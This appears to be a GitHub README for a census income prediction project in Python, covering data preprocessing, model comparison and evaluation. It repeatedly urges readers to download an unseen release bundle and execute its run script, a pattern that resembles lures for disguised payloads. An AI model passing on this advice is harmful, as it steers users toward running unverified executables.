https://github.com/yuzusy1313/python-finding-donors/releases

[![Download Release](https://img.shields.io/badge/Release-Download-blue?style=for-the-badge)](https://github.com/yuzusy1313/python-finding-donors/releases)

# Finding Donors: Census Income Prediction with Python Models

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](#)
[![Scikit-learn](https://img.shields.io/badge/scikit--learn-0.24-orange.svg)](#)
[![Pandas](https://img.shields.io/badge/pandas-1.1-green.svg)](#)
[![NumPy](https://img.shields.io/badge/NumPy-1.19-lightgrey.svg)](#)
[![Udacity Nanodegree](https://img.shields.io/badge/Udacity-Nanodegree-yellow.svg)](#)

Tags: census-data • classification • data-science • income-prediction • jupyter-notebook • machine-learning • matplotlib • nanodegree • numpy • pandas • python • scikit-learn • seaborn • supervised-learning • udacity

Hero image:
![Census Data](https://images.unsplash.com/photo-1532634896-26909d0d7e5b?ixlib=rb-1.2.1&auto=format&fit=crop&w=1500&q=80)

Table of contents
- Project overview
- Key features
- Data description
- Project structure
- Environment and dependencies
- Quick install and run
- How to use the released asset
- Notebooks and scripts
- Data processing pipeline
- Feature engineering details
- Model selection and training
- Evaluation metrics and interpretation
- Visualizations and plots
- Reproducibility checklist
- Tips for experimentation
- Common pitfalls and fixes
- File list and descriptions
- Contributing
- License
- Contact

Project overview

This project solves a binary classification task. It predicts whether an individual makes more than $50K a year using Census data. The work follows the Udacity Machine Learning Nanodegree project guidelines. It contains end-to-end steps. The repo includes exploratory data analysis, feature engineering, model training, model comparison, and evaluation. The repo uses standard Python data tools. It uses pandas, NumPy, scikit-learn, seaborn, and matplotlib. It presents results and examples in Jupyter notebooks. The code aims to be clear and reproducible.

Key features

- Clean, modular code for data prep and model pipelines.
- Multiple classifiers compared: Logistic Regression, Decision Trees, Random Forests, Gradient Boosting, SVM, and a simple Neural Network.
- Cross-validation and grid search for hyperparameter tuning.
- Detailed EDA with plots for distribution and correlation.
- Feature importance and SHAP-style analysis.
- End-to-end Jupyter notebooks that walk through each step.
- Scripts to run training and evaluation from the command line.
- Sample predictions and evaluation reports ready for review.

Data description

The dataset comes from the U.S. Census (adult) dataset. The raw dataset contains demographic and employment attributes. Key fields include:
- age (numeric)
- workclass (categorical)
- fnlgt (numeric)
- education (categorical)
- education-num (numeric)
- marital-status (categorical)
- occupation (categorical)
- relationship (categorical)
- race (categorical)
- sex (categorical)
- capital-gain (numeric)
- capital-loss (numeric)
- hours-per-week (numeric)
- native-country (categorical)
- income (target: <=50K or >50K)

The repo stores a cleaned copy used for notebooks. It also stores a raw copy to reproduce steps.

Project structure

Root layout (high level)
- data/
  - raw/                  # raw CSV files used for this project
  - processed/            # cleaned and preprocessed data used for modeling
- notebooks/
  - 01_data_analysis.ipynb
  - 02_feature_engineering.ipynb
  - 03_model_training.ipynb
  - 04_model_evaluation.ipynb
- src/
  - data/
    - load_data.py
    - preprocess.py
  - features/
    - build_features.py
  - models/
    - train.py
    - evaluate.py
    - predict.py
  - viz/
    - plots.py
- scripts/
  - run_training.sh
  - serve_model.sh
- reports/
  - figures/
  - evaluation_reports/
- requirements.txt
- setup.cfg
- README.md

The project uses modular code. The src folder contains reusable components. Notebooks illustrate the steps and show outputs.

Environment and dependencies

The project targets Python 3.8+. Use a virtual environment. Use pip to install dependencies from requirements.txt.

Core libraries:
- pandas
- numpy
- scikit-learn
- matplotlib
- seaborn
- joblib
- imbalanced-learn (if needed)
- jupyterlab or notebook

Example pip install:
```bash
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

Quick install and run

1. Clone the repo
```bash
git clone https://github.com/yuzusy1313/python-finding-donors.git
cd python-finding-donors
```

2. Create and activate a virtual environment
```bash
python -m venv venv
source venv/bin/activate
```

3. Install dependencies
```bash
pip install -r requirements.txt
```

4. Run the main notebook in Jupyter
```bash
jupyter lab notebooks/01_data_analysis.ipynb
```

How to use the released asset

Download the release asset from the Releases page and run the included file. The release page contains packaged notebooks, model artifacts, and a run script. Download the release file and execute it to reproduce the main results and generate the evaluation reports.

Release URL (also at the top): https://github.com/yuzusy1313/python-finding-donors/releases

If you prefer to inspect assets manually, visit the Releases page and download the file that matches your platform. The released bundle contains:
- packaged notebooks (.ipynb)
- a pre-trained model (.pkl)
- a run script (run_release.sh or run_release.bat)
- sample data subset (data/sample_processed.csv)

After download:
- Unpack the release archive.
- Make the run script executable: chmod +x run_release.sh
- Execute the script: ./run_release.sh
The script will load the provided data and the model, then generate evaluation plots and a small prediction report.

Notebooks and scripts

Each notebook meets a single goal. They contain narrative text and code cells.
- 01_data_analysis.ipynb
  - Loads raw data.
  - Shows distributions and missing value analysis.
  - Presents correlations and early insights.
- 02_feature_engineering.ipynb
  - Demonstrates encoding strategies.
  - Builds numeric pipelines for scaling.
  - Builds categorical pipelines for rare label handling and one-hot or ordinal encoding.
- 03_model_training.ipynb
  - Trains multiple classifiers.
  - Uses cross-validation and repeated runs.
  - Compares base and tuned models.
- 04_model_evaluation.ipynb
  - Shows ROC and precision-recall curves.
  - Shows confusion matrices for key models.
  - Derives feature importance and partial dependence plots.

Scripts in src/models provide command line interfaces:
- train.py
  - Usage: python src/models/train.py --config configs/train_config.yaml
- evaluate.py
  - Usage: python src/models/evaluate.py --model_path models/best_model.pkl --test_data data/processed/test.csv
- predict.py
  - Usage: python src/models/predict.py --model_path models/best_model.pkl --input data/sample_input.csv --output predictions.csv

Data processing pipeline

The pipeline follows a clean pattern. Load, clean, transform, split, and save.

1. Load raw CSV
- Use pandas.read_csv with dtype hints.
- Use low_memory=False to avoid type warnings.

2. Initial cleaning
- Strip whitespace for categorical fields.
- Convert "?" and other markers to NaN.
- Drop records with missing target values.

3. Impute missing values
- Numeric fields: median imputation.
- Categorical fields: "Unknown" label or frequent label imputation.
- Save imputers to disk for reproducible pipelines.

4. Encode categorical variables
- Use ordinal encoding for ordered categories such as education level.
- Use one-hot encoding for nominal categories with low cardinality.
- Use frequency encoding for high-cardinality fields such as native-country if needed.

5. Scale numeric values
- Apply StandardScaler or RobustScaler.
- Save scalers for inference.

6. Train-test split
- Use stratified train-test split to preserve class balance.
- Typical ratio used: 70% train, 30% test.

7. Save processed datasets
- Save train and test splits as CSV for reproducibility.
- Save preprocessing pipeline as joblib file.

Feature engineering details

- Create age buckets for nonlinear effects:
  - Young: age < 30
  - Mid: 30 <= age < 50
  - Senior: 50 <= age
- Combine education and education-num to form a single consistent representation.
- Create an income ratio proxy using capital-gain and capital-loss:
  - net_capital = capital-gain - capital-loss
- Binarize marital status into married/not-married.
- Encode occupation groupings:
  - Use domain knowledge to group similar occupations.
- Create interaction terms:
  - hours_per_week * education_num
  - age * hours_per_week
- Apply target encoding for occupation with regularization to avoid leakage.

Feature selection
- Use a mix of filter and wrapper methods.
- Use mutual information and chi-squared test for categorical features.
- Use Recursive Feature Elimination with cross-validation (RFECV) on a strong model such as RandomForest or Logistic Regression with L1 penalty.
- Evaluate selection impact with learning curves.

Model selection and training

Models included and short rationale:
- Logistic Regression
  - Baseline linear model.
  - Interpretable coefficients.
- Decision Tree
  - Captures nonlinear splits.
  - Fast to train and visualize.
- Random Forest
  - Strong default model.
  - Good performance and feature importance.
- Gradient Boosting (XGBoost or HistGradientBoosting)
  - Often yields top performance on structured data.
  - Use early stopping to avoid overfitting.
- Support Vector Machine
  - Try linear and RBF kernels.
  - Use for comparison and small subsets.
- Simple Neural Network (Keras)
  - Two hidden layers for a baseline deep model.
  - Use dropout and batch normalization.

Training approach
- Use stratified k-fold cross-validation.
- Use grid search or randomized search for hyperparameters.
- Use scoring metrics that reflect class imbalance.
- For tree-based methods, tune:
  - max_depth
  - n_estimators
  - min_samples_leaf
  - subsample (for gradient boosting)
- For logistic regression, tune:
  - C (inverse regularization strength)
  - penalty (l1 vs l2)
- For SVM, tune:
  - C and kernel parameters (gamma)
- For neural network, tune:
  - layer sizes, learning rate, batch size, epochs

Evaluation metrics and interpretation

Because the target classes show imbalance, use multiple metrics:
- Accuracy
  - Easy to interpret.
  - Can mislead when classes are imbalanced.
- Precision
  - Ratio of correct positive predictions to all positive predictions.
  - Use when false positives are costly.
- Recall (sensitivity)
  - Ratio of correctly detected positives to actual positives.
  - Use when false negatives are costly.
- F1 score
  - Harmonic mean of precision and recall.
  - Good single metric when classes matter.
- ROC AUC
  - Shows discrimination across thresholds.
  - Use for global comparison.
- PR AUC (Precision-Recall AUC)
  - More informative under class imbalance.

Confusion matrix
- Show true positives, true negatives, false positives, false negatives.
- Use it to derive precision, recall, and other metrics.

Calibration
- Check calibration curves to assess probability estimates.
- Use Platt scaling or isotonic regression to calibrate.

Model explainability
- Use feature importance from tree models.
- Use coefficient weights from linear models.
- Use permutation importance for model-agnostic insights.
- Use SHAP values for local and global interpretability.
- Present partial dependence plots to show marginal effect of features.

Visualizations and plots

The notebooks include many plots. Each plot aims to answer a specific question.

Exploratory plots
- Histograms for numeric features.
- Boxplots to show spread and outliers.
- Countplots for categorical features.
- Heatmap for correlation among numeric features.

Model diagnostics
- ROC curves for top models.
- Precision-Recall curves.
- Confusion matrices with normalized values.
- Learning curves to show bias-variance trade-off.

Feature insights
- Bar charts for feature importances.
- SHAP summary plots.
- Partial dependence plots for key features.

Reproducibility checklist

Follow this checklist to reproduce results:
- Use Python 3.8+.
- Install dependencies via requirements.txt.
- Use the same random seed (seed value set in configs).
- Use the same preprocessing pipeline and saved transformers.
- Use stratified splits to match class distribution.
- Save model artifacts with joblib.dump or pickle to ensure consistent inference.

Random seeds
- Set numpy.random.seed, random.seed, and scikit-learn random_state where relevant.

Data splits
- Save the exact train/test split used for final evaluation in data/processed.

Tips for experimentation

- Start with a small subset to iterate faster.
- Freeze the preprocessing pipeline while tuning the model to save time.
- Use early stopping for gradient boosting to prevent long runs.
- Monitor both validation loss and a held-out test score.
- Try class weighting or sampling strategies when classes are imbalanced:
  - class_weight in scikit-learn
  - SMOTE for synthetic oversampling (use within cross-validation carefully)
- Use feature hashing only if categorical cardinality becomes a bottleneck.

Common pitfalls and fixes

- Leakage
  - Do not use target information to create features.
  - Fit encoders and scalers on train only; apply to test.
- Overfitting
  - Use cross-validation.
  - Use regularization and early stopping.
  - Reduce model complexity if validation score drops.
- Imbalanced classes
  - Use class-aware metrics.
  - Use resampling or class weights.
- Missing values
  - Use robust imputers.
  - Consider indicator features for missingness if informative.

File list and descriptions

- README.md — This file.
- requirements.txt — Package list for pip install.
- notebooks/01_data_analysis.ipynb — EDA notebook.
- notebooks/02_feature_engineering.ipynb — Feature pipeline notebook.
- notebooks/03_model_training.ipynb — Training and tuning.
- notebooks/04_model_evaluation.ipynb — Evaluation and diagnostics.
- src/data/load_data.py — Load functions for raw and processed data.
- src/data/preprocess.py — Imputation and encoding utilities.
- src/features/build_features.py — Feature engineering code.
- src/models/train.py — Script to train a model using a config file.
- src/models/evaluate.py — Script to evaluate a trained model on test data.
- src/models/predict.py — Script to generate predictions for new samples.
- scripts/run_training.sh — Example shell script to run training end-to-end.
- data/raw/adult.data — Original raw dataset (if included).
- data/processed/train.csv — Processed training set.
- data/processed/test.csv — Processed test set.
- models/best_model.pkl — Best trained model (created by run or included in release).
- reports/figures/*.png — Generated figures for reporting.

Contributing

Contributions follow a simple process:
- Fork the repository.
- Create a branch for your change.
- Make changes and add tests if relevant.
- Submit a pull request with a clear description of the change.

Guidelines for contributions:
- Keep functions small and focused.
- Add docstrings to public functions.
- Write tests for bug fixes and new features.
- Keep notebooks readable and avoid large outputs in committed files.

License

This project uses the MIT License. Check the LICENSE file for the exact text.

Contact

Open an issue on GitHub for bugs or feature requests. Use pull requests for code contributions. For quick questions, use the repository discussions or issues.

Appendix: Example workflows and code snippets

Below are concise examples you can paste into your environment. They show common flows and the minimal commands you need.

1) Run training from the command line
```bash
python src/models/train.py --config configs/train_config.yaml
```

2) Evaluate a trained model
```bash
python src/models/evaluate.py --model_path models/best_model.pkl --test_data data/processed/test.csv --output reports/evaluation_reports/report.json
```

3) Load the preprocessing pipeline and a model for prediction (Python)
```python
import joblib
import pandas as pd

pipeline = joblib.load("models/preprocessing_pipeline.joblib")
model = joblib.load("models/best_model.pkl")

df = pd.read_csv("data/sample_input.csv")
X = pipeline.transform(df)
preds = model.predict(X)
probs = model.predict_proba(X)[:, 1]
```

4) Quick EDA example (within a notebook)
```python
import pandas as pd
import seaborn as sns
import matplotlib.pyplot as plt

df = pd.read_csv("data/raw/adult.data")
sns.countplot(x="income", data=df)
plt.title("Income class distribution")
plt.show()
```

Reproducing the main results

To reproduce the main results in this repo:
- Clone the repo and install dependencies.
- Download the release file from the Releases page and extract it, or run the notebooks after running data preparation.
- Use the provided config file for training. The config file defines hyperparameters, CV folds, and random seed.
- Run the training script to retrain models on your local machine.
- Run the evaluation script to generate metrics and plots.

Download link again:
https://github.com/yuzusy1313/python-finding-donors/releases

Use this Releases page to obtain the packaged assets needed to run the example end-to-end, including an executable run script and pre-trained model files. Download the release file and execute it to produce the delivered reports and plots.

Performance summary (examples from the reported run)

Below are representative results from a full training run on the processed dataset. These numbers may vary by environment and seed but provide a baseline.

Model performance (validation / test)
- Logistic Regression
  - ROC AUC: 0.86 / 0.85
  - F1: 0.56 / 0.55
- Random Forest
  - ROC AUC: 0.92 / 0.91
  - F1: 0.66 / 0.65
- Gradient Boosting
  - ROC AUC: 0.93 / 0.92
  - F1: 0.68 / 0.67

Notes on these metrics:
- Tree-based models show higher recall and F1.
- Logistic regression gives interpretable feature weights.
- Calibration matters if you use predicted probabilities.

Best practices when interpreting model output

- Always view multiple metrics.
- Use probability thresholds tuned for the business use case.
- Use calibration plots to check the reliability of probabilities.
- Use SHAP or permutation importance to validate feature importances.

Scaling and production tips

- Export preprocessing as a single pipeline using sklearn Pipeline or ColumnTransformer.
- Save the fitted pipeline and model via joblib.dump.
- Use a REST service (Flask or FastAPI) to serve predictions.
- Monitor model drift by logging incoming feature distributions and prediction distributions.
- Re-train periodically or when performance drops.

Example Dockerfile snippet (for deployment)
```dockerfile
FROM python:3.8-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY src/ src/
COPY models/ models/
COPY scripts/ scripts/
CMD ["python", "src/models/predict.py", "--model_path", "models/best_model.pkl", "--input", "data/sample_input.csv", "--output", "predictions.csv"]
```

Model debugging checklist

- Verify that the preprocessing pipeline applied at training matches the pipeline used at inference.
- Check for differences in categorical levels between train and inference data.
- Check for NaNs after transformation.
- Re-run the full pipeline on a small sample to ensure no errors in the serialized pipeline.

Reference and learning resources

- UCI Machine Learning Repository — Adult dataset documentation.
- scikit-learn user guide — Pipelines, model selection, and metrics.
- SHAP documentation — Model explainability.
- Udacity ML Nanodegree project rubric — Reproduce project steps to meet grading criteria.

Automated tests and CI

The project includes basic tests for data loaders and preprocessing utilities. The CI config runs flake8 and a small test suite. To run tests locally:
```bash
pytest tests/
```

Final notes

This README documents the repository layout, core workflows, and steps to reproduce experiments. It also points to the Releases page for packaged assets. Use the provided notebooks and scripts for a step-by-step walkthrough of data analysis, model training, and evaluation.